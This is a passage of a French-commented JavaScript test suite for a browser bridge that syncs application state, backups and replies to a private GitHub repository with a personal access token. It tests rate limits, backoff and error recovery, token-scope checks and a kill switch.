  const r = X.rep(b).r, d = new Date(T0 + 17000), p2 = n => (n < 10 ? '0' : '') + n;   // activation finie à T0 + 2 s, premier relevé 15 s après
  const nom = 'backups/aura_guardian_full_' + d.getFullYear() + p2(d.getMonth() + 1) + p2(d.getDate()) + '-' + p2(d.getHours()) + p2(d.getMinutes()) + p2(d.getSeconds()) + '.json.gz';
  assert.strictEqual(r.fichier, nom); assert.strictEqual(r.gz, true); assert.strictEqual(r.cycle, 1253765); assert.strictEqual(r.sha, X.gh.sha(nom));
  const env = JSON.parse(zlib.gunzipSync(Buffer.from(X.gh.octets(nom))).toString('utf8')); assert.strictEqual(r.caracteres, JSON.stringify(env).length); assert.strictEqual(r.octetsEnvoyes, X.gh.octets(nom).length);
  // référence : exportForClaude de 10h, en vm, sur le même snapshot
  let ref = null; const sb = { buildSnapshot: () => J(env.aura), _shareOrDownloadJSON: (json, f) => { ref = JSON.parse(json); return Promise.resolve('fs-written'); }, showToast() {}, _PONT_V: 'v5.0', Date, JSON, Promise, String };
  sb.window = sb; vm.runInNewContext(EXPORT_10H + '\nexportForClaude();', sb);
  assert.deepStrictEqual(Object.keys(env), Object.keys(ref)); assert.strictEqual(ref.auraSource, 'aura-live'); assert.strictEqual(env.auraSource, 'aura-pont');
  ['_type', 'version', 'auraCycle', 'auraSavedAt', 'guardian'].forEach(k => assert.deepStrictEqual(env[k], ref[k], k)); assert.deepStrictEqual(env.aura, ref.aura); assert.strictEqual(env.savedAt, new Date(T0 + 17000).toISOString());
  assert.strictEqual(env.aura.walletStore.paperReal.openPositions.length, 2); assert.strictEqual(env.aura.key, 'nexus_state_v2'); assert.strictEqual(mem(X).backupAt, T0 + 17000);
  const nBk = () => X.gh.chemins().filter(p => p.startsWith('backups/a')).length, nOp = () => X.stats.ops.filter(o => o === 'pont:backup').length;
  const b2 = X.demande(2, 'backup'); await X.jusqua(() => X.rep(b2) !== null); assert.ok(/un backup toutes les 2 min au plus/.test(X.rep(b2).err)); assert.strictEqual(nBk(), 1);
  await X.avancer(2 * MIN); const b3 = X.demande(3, 'backup'); await X.jusqua(() => X.rep(b3) !== null); assert.strictEqual(X.rep(b3).ok, true); assert.strictEqual(nBk(), 2);
  const bs0 = X.c.buildSnapshot;
  await X.avancer(3 * MIN); X.c._stateReady = false; const b4 = X.demande(4, 'backup'); await X.jusqua(() => X.rep(b4) !== null); assert.strictEqual(X.rep(b4).err, 'état non prêt');
  X.c._stateReady = true; X.c.buildSnapshot = () => null; const b5 = X.demande(5, 'backup'); await X.jusqua(() => X.rep(b5) !== null); assert.strictEqual(X.rep(b5).err, 'état non prêt');
  X.c.buildSnapshot = undefined; const b5b = X.demande(15, 'backup'); await X.jusqua(() => X.rep(b5b) !== null); assert.strictEqual(X.rep(b5b).err, 'état non prêt'); X.c.buildSnapshot = bs0;
  // l'écriture du backup échoue : refus, et pas de pénitence de 2 min (rien n'a été écrit)
  const p = q => (q.m === 'PUT' && /backups\//.test(q.url) ? { st: 500, j: { message: 'Server Error' } } : null); p.une = true; X.gh.panne(p);
  const b6 = X.demande(6, 'backup'); await X.jusqua(() => X.rep(b6) !== null); assert.ok(/backup non écrit · GitHub 500/.test(X.rep(b6).err), X.rep(b6).err); assert.strictEqual(nBk(), 2);
  const b7 = X.demande(7, 'backup'); await X.jusqua(() => X.rep(b7) !== null); assert.strictEqual(X.rep(b7).ok, true, JSON.stringify(X.rep(b7))); assert.strictEqual(nBk(), 3);
  // le backup est écrit mais sa RÉPONSE ne part pas (réseau) : au tour suivant la même réponse repart — ni second backup, ni faux refus
  await X.avancer(3 * MIN); const op0 = nOp();
  const q = z => (z.m === 'PUT' && /reponses\//.test(z.url) ? 'reseau' : null); q.une = true; X.gh.panne(q);
  const b8 = X.demande(8, 'backup'); await X.jusqua(() => X.rep(b8) !== null);
  assert.strictEqual(X.rep(b8).ok, true, JSON.stringify(X.rep(b8))); assert.ok(X.gh.existe(X.rep(b8).r.fichier)); assert.strictEqual(nBk(), 4); assert.strictEqual(nOp(), op0 + 1, 'exécutée une seule fois'); assert.strictEqual(X.st().echecs, 1);
  const Y = monde({ sansGzip: true }); await Y.activer(PAT_OK); const y = Y.demande(1, 'backup'); await Y.jusqua(() => Y.rep(y) !== null);
  assert.strictEqual(Y.rep(y).r.gz, false); assert.ok(Y.rep(y).r.fichier.endsWith('.json')); assert.strictEqual(JSON.parse(Y.gh.texte(Y.rep(y).r.fichier)).aura.cycle, 1253765); assert.strictEqual(Y.rep(y).r.octetsEnvoyes, null);
  const Z = monde(); Z.c.Response = class { arrayBuffer() { return new Promise(() => {}); } }; await Z.activer(PAT_OK); const z = Z.demande(1, 'backup'); await Z.jusqua(() => Z.rep(z) !== null);
  assert.strictEqual(Z.rep(z).ok, true); assert.strictEqual(Z.rep(z).r.gz, false); assert.ok(Z.rep(z).ms >= 30000 && Z.rep(z).ms < 40000, 'ms ' + Z.rep(z).ms);
});

// ───────────── H · débit, erreurs, reprise ─────────────
T('P23 · cadence : un état toutes les 5 min (12 par heure), un relevé toutes les 15 s (240 par heure) ; etat.json réécrit avec son sha ; 2 s au moins entre deux écritures ; chaque état dit les battements du pont depuis l\'état d\'avant et le plus long trou — une page endormie 2 h se voit', async () => {
  const X = monde(); await X.activer(PAT_OK); const i0 = X.gh.journal.length;
  await X.avancer(H);
  const L = X.gh.journal.slice(i0), etats = L.filter(r => r.m === 'PUT' && /etat\.json$/.test(r.url));
  assert.strictEqual(etats.length, 12); assert.ok(etats.every(r => typeof r.corps.sha === 'string' && r.corps.sha.length === 40), 'sha fourni'); assert.strictEqual(L.filter(r => r.m === 'GET' && /contents\/demandes$/.test(r.url)).length, 240);
  assert.strictEqual(L.length, 252, 'rien d\'autre : ' + chemins(L).filter(x => !/etat\.json|demandes$/.test(x)).join(' ; '));
  assert.ok(/^etat 2026-10-11T\d\d:\d\d:\d\d\.\d{3}Z · cycle 1253765 · doc /.test(etats[0].corps.message));
  let ep = JSON.parse(X.gh.texte('etat.json')).etatPont; assert.strictEqual(ep.tics, 20); assert.strictEqual(ep.ticMax, 15000); assert.ok(ep.releveAt > T0 && ep.pauseUntil === 0);
  [1, 2, 3, 4, 5, 6].forEach(n => X.demande(n, 'ping')); await X.avancer(MIN);
  const w = X.appels.filter(a => a.m === 'PUT'); for (let i = 1; i < w.length; i++) assert.ok(w[i].t - w[i - 1].t >= 2000, 'écart ' + (w[i].t - w[i - 1].t));
  assert.strictEqual(X.st().servis, 6);
  for (const t of X.timers.values()) t.due += 2 * H; X.clock.t += 2 * H;   // la page dort 2 h : aucune minuterie ne passe
  await X.avancer(20000);
  ep = JSON.parse(X.gh.texte('etat.json')).etatPont; assert.strictEqual(ep.ticMax, 2 * H + 15000, 'le trou de 2 h est dit dans l\'état qui suit le réveil'); assert.ok(JSON.parse(X.gh.texte('etat.json')).t >= X.clock.t - 20000);
});
T('P24 · etat.json : déjà présent (sha inconnu) → 422 → sha relu → réécrit ; sha dépassé (409) → relu → réécrit ; fichier RETIRÉ du dépôt alors que son sha est gardé — que GitHub réponde 404, 409, 422 ou le crée — → réécrit, même après un rechargement (relecture) ; un dossier à son nom : les demandes sont servies quand même, nouvel essai toutes les 5 min', async () => {
  let X = monde(); X.gh.poser('etat.json', '{"ancien":true}');
  await X.activer(PAT_OK, 4000);
  assert.deepStrictEqual(chemins(X.gh.journal).slice(3), ['PUT aura-pont/contents/etat.json', 'GET aura-pont/contents/etat.json', 'PUT aura-pont/contents/etat.json']);
  assert.strictEqual(JSON.parse(X.gh.texte('etat.json')).cycle, 1253765); assert.strictEqual(X.st().etat, 'actif');
  X.gh.poser('etat.json', '{"ecrit":"par ailleurs"}'); await X.avancer(5 * MIN + 5000);
  assert.strictEqual(JSON.parse(X.gh.texte('etat.json')).cycle, 1253765); assert.strictEqual(X.st().echecs, 0);
  for (const rep of [404, 409, 422, 'cree']) {
    X = monde(); X.gh.shaSurAbsent = rep; await X.activer(PAT_OK); X.gh.retirer('etat.json'); await X.avancer(5 * MIN + 6000);
    assert.ok(X.gh.existe('etat.json'), 'cas ' + rep); assert.strictEqual(X.st().echecs, 0); assert.strictEqual(X.st().etat, 'actif');
    const B = monde({ ls: Object.fromEntries(X.ls), gh: X.gh, t0: X.clock.t + 1000 }); X.gh.retirer('etat.json'); const p = B.demande(1, 'ping'); await B.avancer(2 * MIN);
    assert.ok(X.gh.existe('etat.json'), 'après un rechargement, cas ' + rep); assert.strictEqual(B.st().etat, 'actif'); assert.strictEqual(B.st().echecs, 0); assert.ok(B.rep(p).ok);
  }
  X = monde(); await X.activer(PAT_OK); X.gh.retirer('etat.json'); X.gh.poser('etat.json/x', '1');
  const p1 = X.demande(1, 'ping'); await X.avancer(6 * MIN);
  assert.ok(X.rep(p1) && X.rep(p1).ok, 'la demande est servie'); assert.ok(/etat\.json non écrit · GitHub 422/.test(X.st().err), X.st().err); assert.strictEqual(X.st().etat, 'actif'); assert.strictEqual(X.st().echecs, 0); assert.ok(/dernier incident .*etat\.json non écrit/.test(ligne(X)));
  const e0 = X.puts(/etat\.json$/).length; await X.avancer(30 * MIN); const de = X.puts(/etat\.json$/).length - e0; assert.ok(de >= 10 && de <= 12 && de % 2 === 0, 'deux écritures tentées (écriture, relecture du sha, écriture) toutes les 5 min, pas davantage : ' + de);
  const p2 = X.demande(2, 'ping'); await X.avancer(MIN); assert.ok(X.rep(p2).ok);
  X.gh.retirer('etat.json/x'); await X.avancer(5 * MIN + 5000); assert.ok(X.gh.existe('etat.json')); assert.strictEqual(JSON.parse(X.gh.texte('etat.json')).cycle, 1253765);
});
T('P25 · relecture — le battement n\'est JAMAIS affamé : 60 écritures par heure au plus, dont 12 gardées pour etat.json ; rafale de 60 demandes → 46 réponses, puis les demandes ATTENDENT, etat.json bat toujours ; une demande fraîche passe AVANT celles en retard dès qu\'une place se libère', async () => {
  const X = monde(); await X.activer(PAT_OK);   // 2 écritures comptées : le contrôle et etat.json
  let n = 0; const ids = [];
  for (let m = 0; m < 20; m++) { for (let k = 0; k < 3; k++) ids.push(X.demande(++n, 'ping', undefined, { ttl: 3600 })); await X.avancer(15000); }   // 60 demandes en 5 min
  await X.avancer(MIN);
  assert.strictEqual(X.puts(/reponses/).length, 46, '48 écritures pour les demandes, moins le contrôle et le premier état');
  assert.ok(/quota d'écritures du pont atteint \(60 \/ h, dont 12 gardées pour etat\.json\)/.test(X.st().err), X.st().err); assert.strictEqual(X.st().etat, 'actif'); assert.strictEqual(X.st().echecs, 0);
  await X.avancer(24 * MIN); const frais = X.demande(99, 'ping', undefined, { ttl: 3600 }); await X.avancer(29 * MIN);   // T0 + 59 min
  assert.strictEqual(X.puts(/reponses/).length, 46, 'rien de plus pour les demandes pendant l\'heure'); assert.strictEqual(X.rep(frais), null);
  const te = X.appels.filter(a => a.m === 'PUT' && /etat\.json$/.test(a.url)).map(a => a.t); assert.strictEqual(te.length, 12, 'etat.json : 1 + 11 en 59 min');
  for (let i = 1; i < te.length; i++) assert.ok(te[i] - te[i - 1] <= 5 * MIN + 15000, 'trou entre deux états : ' + (te[i] - te[i - 1]) / 1000 + ' s');
  assert.strictEqual(mem(X).ecrits.length, 59); assert.strictEqual(X.gh.journal.filter(r => r.m === 'PUT').length, 59, 'tout compris (contrôle, états, réponses)');
  const i59 = X.gh.journal.length; await X.jusqua(() => X.rep(frais) !== null, 5000, 120);
  const apres = X.gh.journal.slice(i59).filter(r => r.m === 'PUT' && /reponses/.test(r.url)); assert.ok(apres.length >= 1 && apres[0].url.endsWith(frais + '.json'), 'la plus récente d\'abord : ' + chemins(apres.slice(0, 2)));
  assert.strictEqual(X.rep(frais).ok, true); assert.ok(X.clock.t - T0 < 66 * MIN, 'servie dès qu\'une place se libère : ' + Math.round((X.clock.t - T0) / 1000) + ' s');
  await X.avancer(20 * MIN); const lus = X.lusDem(), rp = X.puts(/reponses/).length; await X.avancer(15 * MIN);
  assert.strictEqual(X.lusDem(), lus, 'les demandes de la rafale ont plus de 65 min : plus aucune n\'est lue'); assert.strictEqual(X.puts(/reponses/).length, rp);
  for (let h = 0; h < 4; h++) { const t = X.clock.t - h * 15 * MIN; assert.ok(X.appels.filter(a => a.m === 'PUT' && a.t > t - H && a.t <= t).length <= 60, 'jamais plus de 60 écritures sur une heure glissante'); }
});
T('P26 · relecture — au réveil après 9 h d\'arrêt avec 72 demandes laissées : etat.json au premier battement, la demande fraîche servie dans la minute, les 63 de plus de 65 min jamais lues ; 110 demandes mortes dans le dossier : la fraîche est servie tout de suite ; le compte des écritures survit aux rechargements (5 en 40 min : 60 au plus)', async () => {
  const A = monde(); await A.activer(PAT_OK); await A.avancer(MIN);
  const t9 = A.clock.t + 9 * H; let k = 0;
  for (let q = 535; q > 0; q -= 7.5) A.demande(100 + (++k), 'ping', undefined, { t: t9 - q * MIN }, t9 - q * MIN);   // une toutes les 7 min 30, la dernière 2 min 30 avant le réveil
  assert.strictEqual(k, 72);
  const B = monde({ ls: Object.fromEntries(A.ls), gh: A.gh, t0: t9 }), e0 = B.puts(/etat\.json$/).length, lus0 = B.lusDem();
  await B.avancer(20000); assert.strictEqual(B.puts(/etat\.json$/).length, e0 + 1, 'etat.json dès le premier battement');
  const frais = B.demande(1, 'ping'); await B.avancer(40000);
  assert.ok(B.rep(frais) && B.rep(frais).ok, 'demande fraîche servie dans la minute');
  await B.avancer(MIN);
  assert.strictEqual(B.lusDem() - lus0, 10, '9 demandes de moins de 65 min + la fraîche ; les 63 autres ne sont pas lues');
  assert.strictEqual(B.st().servis, 3, 'la fraîche et les deux de moins de 15 min'); assert.strictEqual(B.st().refus, 7, '7 périmées (validité 15 min), dites dans leur réponse');
  const i0 = B.gh.journal.length; await B.avancer(10 * MIN); const suite = B.gh.journal.slice(i0);
  assert.strictEqual(suite.filter(r => r.m === 'PUT' && /etat\.json$/.test(r.url)).length, 2); assert.ok(suite.filter(r => r.m === 'GET').every(r => /contents\/demandes$/.test(r.url)), 'plus aucune demande lue');
  // 110 demandes mortes (nom de 2 h) : la fraîche n'attend pas derrière
  const C = monde(); await C.activer(PAT_OK);
  for (let i = 0; i < 110; i++) C.demande(200 + i, 'ping', undefined, undefined, C.clock.t - 2 * H - i * 1000);
  const lusC = C.lusDem(), f = C.demande(1, 'ping'); await C.avancer(MIN);
  assert.ok(C.rep(f) && C.rep(f).ok); assert.strictEqual(C.lusDem() - lusC, 1, 'aucune des 110 n\'est lue'); assert.ok(C.gh.journal[C.gh.journal.length - 1].h['If-None-Match'], 'et la liste revient à l\'ETag');
  // rechargements : le compte de l'heure est gardé dans aura_pont_mem
  let D = monde(); await D.activer(PAT_OK);
  for (let tour = 0; tour < 5; tour++) {
    for (let i = 0; i < 15; i++) D.demande(tour * 20 + i, 'ping', undefined, { ttl: 3600 });
    await D.avancer(8 * MIN);
    D = monde({ ls: Object.fromEntries(D.ls), gh: D.gh, t0: D.clock.t + 1000 });
  }
  await D.avancer(MIN);
  const ecr = D.gh.journal.filter(r => r.m === 'PUT').length; assert.ok(ecr <= 60 && ecr >= 55, '5 rechargements en 41 min : ' + ecr + ' écritures tentées (contrôles compris)');
  assert.ok(D.puts(/reponses/).length <= 48 && D.puts(/reponses/).length >= 30, String(D.puts(/reponses/).length)); assert.ok(D.puts(/etat\.json$/).length >= 9, 'etat.json a continué : ' + D.puts(/etat\.json$/).length);
  // le quota entier (60) épuisé : etat.json attend à son tour, les relevés continuent
  const E = monde({ ls: { aura_pont_mem: seme(57, 30 * MIN) } }); await E.activer(PAT_OK); assert.strictEqual(mem(E).ecrits.length, 59);
  await E.avancer(11 * MIN); assert.strictEqual(E.puts(/etat\.json$/).length, 2, 'une place restait : un état, puis plus rien'); assert.ok(/etat\.json non écrit · quota d'écritures/.test(E.st().err), E.st().err); assert.strictEqual(E.st().etat, 'actif'); assert.strictEqual(E.st().echecs, 0);
  const g0 = E.gh.journal.length; await E.avancer(5 * MIN); assert.ok(E.gh.journal.slice(g0).length >= 19 && E.gh.journal.slice(g0).every(r => r.m === 'GET'), 'les relevés continuent');
  await E.avancer(20 * MIN); assert.ok(E.puts(/etat\.json$/).length >= 3, 'l\'heure tourne : etat.json reprend');
});
T('P27 · réseau coupé ou GitHub en panne : la pause double (30 s, 60 s, 2 min, 4 min) puis plafonne à 5 min ; au premier succès le rythme de 15 s reprend ; hors ligne (navigator.onLine) : aucune requête, la ligne le dit ; « Envoyer l\'état » ne passe pas outre une pause', async () => {
  for (const rep of ['reseau', { st: 502, j: { message: 'Bad Gateway' } }]) {
    const X = monde(); await X.activer(PAT_OK); const t0 = X.clock.t, i0 = X.appels.length;
    X.gh.panne(() => rep);
    await X.avancer(22 * MIN);
    assert.deepStrictEqual(X.appels.slice(i0).map(a => (a.t - t0) / 1000), [15, 45, 105, 225, 465, 765, 1065], JSON.stringify(rep));
    assert.strictEqual(X.st().etat, 'actif'); assert.ok(/en pause jusqu'à \d\d:\d\d:\d\d · dernier incident/.test(ligne(X)), ligne(X)); assert.ok(X.ls.has('aura_pont_pat'));
    const n = X.appels.length; X.c.pontDirectEnvoyer(); await X.avancer(40000); assert.strictEqual(X.appels.length, n, '« Envoyer l\'état » pendant la pause : rien ne part');
    X.gh.pannes.length = 0; const i1 = X.appels.length; await X.avancer(2 * MIN);
    const ap = X.appels.slice(i1); assert.strictEqual((ap[0].t - t0) / 1000, 1365); assert.ok(ap[0].m === 'PUT' && /etat\.json$/.test(ap[0].url), 'l\'état demandé part dès la fin de la pause'); assert.ok(ap.some(a => (a.t - t0) / 1000 === 1380) && ap.some(a => (a.t - t0) / 1000 === 1395), 'rythme de 15 s repris');
    assert.strictEqual(X.st().suite, 0);
  }
  const X = monde(); await X.activer(PAT_OK); const i0 = X.appels.length; X.c.navigator.onLine = false; await X.avancer(30 * MIN); assert.strictEqual(X.appels.length, i0); assert.ok(/hors ligne : le pont attend le réseau/.test(ligne(X)), ligne(X));
  X.c.navigator.onLine = true; await X.avancer(20000); assert.ok(X.appels.length > i0); assert.ok(!/hors ligne/.test(ligne(X)));
});
T('P28 · toute attente est bornée (relecture) : une requête qui ne répond jamais est abandonnée à 20 s, même sans AbortController ; corps illisible, liste qui n\'en est pas une : incident, pause, reprise ; limite de débit de GitHub (retry-after, quota à zéro) : attente respectée, 60 s au moins, 1 h au plus ; une réponse qui ne s\'écrit pas : la MÊME réponse 3 fois, puis classée', async () => {
  for (const sansAbort of [false, true]) {
    const X = monde(); if (sansAbort) X.c.AbortController = undefined; await X.activer(PAT_OK);
    const pend = (u, init) => new Promise((res, rej) => { if (init.signal) init.signal.addEventListener('abort', () => rej(Object.assign(new Error('The operation was aborted.'), { name: 'AbortError' }))); });
    let bloque = true; const f0 = X.c.fetch; X.c.fetch = (u, i) => { if (!bloque) return f0(u, i); X.appels.push({ t: X.clock.t, m: (i && i.method) || 'GET', url: String(u) }); return pend(u, i); };
    const t0 = X.clock.t, i0 = X.appels.length; await X.avancer(60000);
    assert.deepStrictEqual(X.appels.slice(i0).map(a => (a.t - t0) / 1000), [15], 'une seule requête en attente, abandonnée à 35 s, pause 30 s'); assert.ok(/délai dépassé/.test(X.st().err), X.st().err);
    bloque = false; await X.avancer(30000); assert.strictEqual(X.st().suite, 0); assert.ok(X.appels.length > i0 + 1); assert.strictEqual(X.timers.size, 1, 'aucune minuterie oubliée');
    assert.strictEqual(X.gh.journal[X.gh.journal.length - 1].opt.signal, !sansAbort);
  }
  let X = monde(); await X.activer(PAT_OK);
  for (const rep of [{ st: 200, corpsRate: true }, { st: 200, brut: '<html>pas du JSON</html>' }, { st: 200, j: { message: 'pas une liste' } }]) {
    const r0 = () => rep; r0.une = true; X.gh.panne(r0); const e = X.st().echecs, i = X.appels.length;
    await X.avancer(50000); assert.strictEqual(X.st().echecs, e + 1, JSON.stringify(rep)); assert.ok(/GitHub 200/.test(X.st().err)); assert.strictEqual(X.appels[i + 1].t - X.appels[i].t, 30000, 'pause de 30 s, puis reprise'); assert.strictEqual(X.st().suite, 0);
    await X.avancer(MIN);
  }
  for (const [ra, attendu] of [['120', 120], ['5', 60], ['99999', 3600]]) {
    X = monde(); await X.activer(PAT_OK);
    const r1 = r => ({ st: 403, j: { message: 'You have exceeded a secondary rate limit' }, h: { 'retry-after': ra } }); r1.une = true; X.gh.panne(r1);
    const t1 = X.clock.t, i1 = X.appels.length; await X.avancer(H + 2 * MIN);
    const ap = X.appels.slice(i1).map(a => (a.t - t1) / 1000); assert.strictEqual(ap[0], 15); assert.strictEqual(ap[1], 15 + Math.ceil(attendu / 15) * 15, 'retry-after ' + ra + ' s : ' + ap.slice(0, 3)); assert.strictEqual(X.st().etat, 'actif'); assert.ok(X.ls.has('aura_pont_pat'));
  }
  X = monde(); await X.activer(PAT_OK);
  const r2 = r => ({ st: 403, j: { message: 'API rate limit exceeded' }, h: { 'x-ratelimit-remaining': '0', 'x-ratelimit-reset': String(Math.round(X.clock.t / 1000) + 1500) } }); r2.une = true; X.gh.panne(r2);
  const t1 = X.clock.t, i1 = X.appels.length; await X.avancer(40 * MIN);
  const ap = X.appels.slice(i1).map(a => (a.t - t1) / 1000); assert.ok(ap[1] - ap[0] >= 1485 && ap[1] - ap[0] <= 1515, 'attente jusqu\'à la remise à zéro du quota : ' + ap.slice(0, 3)); assert.strictEqual(X.st().quota, 4999);
  // une réponse qui ne s'écrit pas (500 à chaque fois) : trois essais de la MÊME réponse, puis la demande est classée — le pont ne tourne pas en rond
  X = monde(); await X.activer(PAT_OK); const id = X.demande(1, 'etat'); X.gh.panne(r => (r.m === 'PUT' && /reponses/.test(r.url) ? { st: 500, j: { message: 'Server Error' } } : null));
  await X.avancer(30 * MIN);
  const essais = X.puts(/reponses/); assert.strictEqual(essais.length, 3, 'trois essais'); assert.ok(essais.every(r => r.corps.content === essais[0].corps.content), 'la même réponse, bâtie une fois');
  assert.ok(mem(X).fait.includes(id)); assert.strictEqual(X.rep(id), null); assert.strictEqual(X.st().refus, 1); assert.strictEqual(X.st().etat, 'actif');
});
T('P29 · PAT refusé en route (401) : pont suspendu, PAT GARDÉ, un seul essai par heure ; l\'accès revient → contrôle refait → actif ; accès perdu (403 à l\'écriture, ou 404 partout) → contrôle refait, et le pont dit pourquoi', async () => {
  const X = monde(); await X.activer(PAT_OK);
  const droits = X.gh.jetons[PAT_OK]; delete X.gh.jetons[PAT_OK];
  const i0 = X.appels.length, t0 = X.clock.t; await X.avancer(3 * H - MIN);
  const ap = X.appels.slice(i0); assert.deepStrictEqual(ap.map(a => Math.round((a.t - t0) / 1000)), [15, 3615, 7215], 'un essai par heure'); assert.deepStrictEqual(ap.slice(1).map(a => a.url), [DEPOT, DEPOT], 'le contrôle du PAT d\'abord');
  assert.strictEqual(X.st().etat, 'suspendu'); assert.ok(X.ls.get('aura_pont_pat') === PAT_OK); assert.ok(/^⏸ suspendu · .*GitHub 401/.test(ligne(X)), ligne(X));
  X.gh.jetons[PAT_OK] = droits; await X.avancer(H);
  assert.strictEqual(X.st().etat, 'actif'); assert.strictEqual(sondes(X), 2, 'contrôle refait');
  X.gh.jetons[PAT_OK] = { pont: 'r', code: null }; const s0 = sondes(X);
  await X.avancer(6 * MIN); assert.strictEqual(X.st().etat, 'suspendu'); assert.ok(/GitHub 403/.test(X.st().err));
  X.gh.jetons[PAT_OK] = droits; await X.avancer(6 * MIN); assert.strictEqual(X.st().etat, 'actif'); assert.strictEqual(sondes(X), s0 + 1);
  X.gh.jetons[PAT_OK] = { pont: null, code: null };   // le PAT ne voit plus aura-pont : tout y répond 404
  await X.avancer(11 * MIN); assert.strictEqual(X.st().etat, 'suspendu'); assert.ok(/ne voit pas aura-pont/.test(ligne(X)), ligne(X)); assert.ok(X.ls.has('aura_pont_pat'));
  const n = X.appels.length; await X.avancer(50 * MIN); assert.strictEqual(X.appels.length, n, 'un essai par heure');
  X.gh.jetons[PAT_OK] = droits; await X.avancer(15 * MIN); assert.strictEqual(X.st().etat, 'actif');
});
T('P30 · au lancement avec un PAT gardé : contrôle complet AVANT toute écriture ; PAT devenu trop large, dépôt devenu public ou servi par Pages, PAT gardé qui n\'a pas la forme → effacé de l\'appareil, pont coupé ; réseau absent au lancement → rien d\'autre n\'est tenté, puis reprise ; contrôle refait chaque jour', async () => {
  let X = monde({ ls: { aura_pont_pat: PAT_OK } });
  assert.deepStrictEqual(X.stats.intervals, [15000]); assert.strictEqual(X.gh.journal.length, 0); assert.strictEqual(X.st().etat, 'verif');
  await X.avancer(15000); assert.deepStrictEqual(chemins(X.gh.journal), CONTROLE, 'le contrôle d\'abord');
  await X.avancer(2000);
  assert.deepStrictEqual(chemins(X.gh.journal), CONTROLE.concat(['PUT aura-pont/contents/etat.json', 'GET aura-pont/contents/demandes'])); assert.strictEqual(X.st().etat, 'actif');
  await X.avancer(24 * H); assert.strictEqual(sondes(X), 2, 'une fois par jour'); assert.strictEqual(X.gh.ecritsCode, 0);
  for (const [pat, opt, mot, pages] of [[PAT_LARGE, {}, 'peut ÉCRIRE'], [PAT_OK, { prive: false }, 'PUBLIC'], [PAT_OK, {}, 'GitHub Pages', true]]) {
    X = monde(Object.assign({ ls: { aura_pont_pat: pat } }, opt)); if (pages) X.gh.pages = true; await X.avancer(MIN);
    assert.ok(!X.ls.has('aura_pont_pat'), mot); assert.strictEqual(X.st().etat, 'coupe'); assert.ok(ligne(X).includes(mot)); assert.strictEqual(X.timers.size, 0); assert.strictEqual(X.puts(/aura-pont/).length, 0); assert.deepStrictEqual(X.winL, []);
    const n = X.gh.journal.length; await X.avancer(H); assert.strictEqual(X.gh.journal.length, n);
  }
  X = monde({ ls: { aura_pont_pat: PAT_CLASSIQUE } }); assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.timers.size, 0); await X.avancer(H); assert.strictEqual(X.gh.journal.length, 0);
  X = monde({ ls: { aura_pont_pat: PAT_OK } }); X.gh.panne(() => 'reseau'); await X.avancer(5 * MIN);
  assert.ok(X.gh.journal.length >= 3 && X.gh.journal.every(r => r.url === DEPOT), 'seul le contrôle est tenté'); assert.ok(X.ls.has('aura_pont_pat')); assert.strictEqual(X.st().etat, 'verif');
  assert.ok(/^contrôle du PAT… · réseau « Failed to fetch » · nouvel essai \d\d:/.test(ligne(X)), ligne(X));
  X.gh.pannes.length = 0; await X.avancer(6 * MIN); assert.strictEqual(X.st().etat, 'actif'); assert.ok(X.gh.existe('etat.json'));
  // au lancement, un PAT qui ne voit plus le dépôt : suspendu, un essai par heure ; GitHub qui demande d'attendre 2 min : 2 min
  X = monde({ ls: { aura_pont_pat: PAT_AUTRE } }); await X.avancer(2 * H + MIN); assert.strictEqual(X.st().etat, 'suspendu'); assert.strictEqual(X.gh.journal.length, 3, 'à 15 s, 1 h, 2 h'); assert.ok(X.ls.has('aura_pont_pat'));
  X = monde({ ls: { aura_pont_pat: PAT_OK } }); const lim = () => ({ st: 429, j: { message: 'Too Many Requests' }, h: { 'retry-after': '120' } }); lim.une = true; X.gh.panne(lim);
  await X.avancer(2 * MIN + 14000); assert.strictEqual(X.gh.journal.length, 1); await X.avancer(4000); assert.ok(X.gh.journal.length >= 4, 'reprise après l\'attente demandée'); assert.strictEqual(X.st().etat, 'actif');
});
T('P31 · page qui se relance en boucle : au lancement, pas plus d\'un état par minute (heure du dernier état gardée dans aura_pont_mem)', async () => {
  const A = monde(); await A.activer(PAT_OK);
  let ls = Object.fromEntries(A.ls), t = A.clock.t, gh = A.gh;
  for (let k = 0; k < 6; k++) { t += 20000; const B = monde({ ls, gh, t0: t }); await B.avancer(19000); t = B.clock.t; ls = Object.fromEntries(B.ls); }   // 6 relances en 3 min 54
  assert.strictEqual(gh.ecrits.filter(p => p === 'etat.json').length, 4, 'états écrits en 3 min 54 de relances (1 à l\'activation + 3)');
  assert.strictEqual(gh.journal.filter(r => r.m === 'PUT' && /etat\.json$/.test(r.url)).length, 4, 'le sha gardé en mémoire : aucune écriture refusée après une relance');
});

// ───────────── I · coupe-circuit, onglets, traces ─────────────
T('P32 · « Couper le pont » : PAT effacé de l\'appareil, minuterie arrêtée, écouteurs retirés, champ vidé, plus AUCUNE requête ; coupé pendant une requête en cours, pendant le contrôle, pendant l\'écriture de l\'activation : rien de plus ne part, le PAT n\'est pas gardé, l\'état reste « coupé » ; « Activer » pendant un battement : dit, pas ignoré en silence ; « Envoyer l\'état » : un état tout de suite', async () => {
  let X = monde(); await X.activer(PAT_OK); await X.avancer(MIN);
  const e0 = X.puts(/etat\.json$/).length; X.c.pontDirectEnvoyer(); await X.avancer(3000); assert.strictEqual(X.puts(/etat\.json$/).length, e0 + 1, 'Envoyer l\'état');
  X.c.pontDirectCouper();
  assert.ok(!X.ls.has('aura_pont_pat')); assert.strictEqual(X.timers.size, 0); assert.deepStrictEqual(X.winL, []); assert.strictEqual(X.st().etat, 'coupe');
  assert.ok(/coupé · le PAT est effacé/.test(ligne(X))); assert.strictEqual(X.els.pontDirectSaisie.style.display, 'flex'); assert.strictEqual(X.els.pontDirectActions.style.display, 'none');
  const n = X.gh.journal.length; X.c.pontDirectEnvoyer(); await X.avancer(H); assert.strictEqual(X.gh.journal.length, n);
  assert.ok(X.ls.has('aura_pont_mem'), 'la mémoire des demandes servies reste');
  await X.activer(PAT_OK); assert.strictEqual(X.st().etat, 'actif'); assert.strictEqual(JSON.parse(X.gh.texte('etat.json')).inst, mem(X).inst, 'on peut réactiver');
  // coupé pendant une requête en cours
  X = monde(); await X.activer(PAT_OK);
  let lache = null; const f0 = X.c.fetch; X.c.fetch = (u, i) => new Promise(res => { lache = () => res(f0(u, i)); });
  await X.avancer(15000); assert.ok(lache, 'une requête est en cours');
  const n2 = X.gh.journal.length; X.c.pontDirectCouper(); X.c.fetch = f0; lache(); await X.avancer(H);
